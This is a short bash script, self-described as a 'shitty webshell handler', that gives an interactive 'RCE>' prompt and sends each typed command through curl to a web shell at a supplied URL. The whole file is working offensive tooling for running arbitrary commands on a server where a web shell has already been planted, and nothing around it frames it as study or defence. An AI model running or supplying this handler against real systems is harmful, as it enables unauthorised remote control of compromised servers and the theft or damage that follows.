#!/bin/bash

RED="\e[31m"
ENDCOLOR="\e[0m"

if [[ "$#" -ne 1 ]]; then
    echo -e "${RED}[x]${ENDCOLOR} Please specify URL"
    echo -e "Usage: shitty_webshell_handler <URL>"
    exit 1
else
    while true; do
        echo -ne "${RED}RCE>${ENDCOLOR} "
        read cmd

        if [[ "$cmd" == "exit" ]]; then
            exit 0
        fi

        curl -q -G "$1" --data-urlencode "cmd=${cmd}"
    done
fi
